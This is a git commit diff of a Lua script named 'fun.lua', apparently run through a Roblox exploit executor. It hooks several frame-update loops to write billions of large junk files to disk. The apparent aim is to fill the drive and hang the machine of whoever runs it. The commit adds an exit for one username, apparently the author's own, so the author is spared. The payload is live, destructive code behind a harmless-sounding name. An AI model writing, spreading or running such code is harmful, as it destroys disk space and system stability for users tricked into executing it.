db62737b405add46fc401681dd97af82e360be99
flipsy <109356301+fakeflipsy@users.noreply.github.com>
2022-08-12 15:02:12 +0200

    Update fun.lua

--- real/fun.lua
+++ real/fun.lua
@@ -1,4 +1,7 @@
-local RunService = game:FindService("RunService")
+if not game:IsLoaded() then game.Loaded:Wait() end
+if game:FindService('Players').LocalPlayer.Name == '67FLIPSY' then return print('no') end
+
+local RunService = game:FindService('RunService')
 local Loops = {
     RunService.Stepped,
     RunService.RenderStepped,
@@ -7,12 +10,12 @@ local Loops = {
     RunService.PreSimulation
 }
 
-local String = string.rep("𪚥🈵", 9e5)
+local String = string.rep('𪚥🈵', 9e5)
 
 for _, RS in ipairs(Loops) do
     RS:Connect(function()
         task.spawn(function()
-            for _ = -9e9, 9e9 do writefile(string.rep("M", 120), _ .. ".txt", String) end        
+            for _ = -9e9, 9e9 do writefile(string.rep('M', 120), _ .. '.txt', String) end        
         end)
     end)
 end
